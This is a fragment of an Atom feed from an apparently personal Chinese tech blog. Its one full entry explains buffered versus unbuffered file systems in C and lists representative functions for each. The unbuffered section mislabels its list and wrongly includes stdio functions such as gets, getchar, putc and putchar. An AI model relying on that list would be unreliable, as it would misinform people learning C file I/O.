      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>缓冲文件系统和非缓冲文件系统</title>
    <link href="https://nocbtm.github.io/2018/11/05/%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%92%8C%E9%9D%9E%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>https://nocbtm.github.io/2018/11/05/缓冲文件系统和非缓冲文件系统/</id>
    <published>2018-11-05T10:31:52.000Z</published>
    <updated>2019-10-01T08:30:17.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将缓冲文件系统扩充为可以处理二进制文件。</p><h2 id="缓冲文件系统"><a href="#缓冲文件系统" class="headerlink" title="缓冲文件系统"></a>缓冲文件系统</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。</p><h3 id="代表函数"><a href="#代表函数" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等</p><h2 id="非缓冲文件系统"><a href="#非缓冲文件系统" class="headerlink" title="非缓冲文件系统"></a>非缓冲文件系统</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。</p><h3 id="代表函数-1"><a href="#代表函数-1" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将
      
    
    </summary>
    
      <category term="linux" scheme="https://nocbtm.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://nocbtm.github.io/tags/linux/"/>
    
  </entry>
  
</feed>
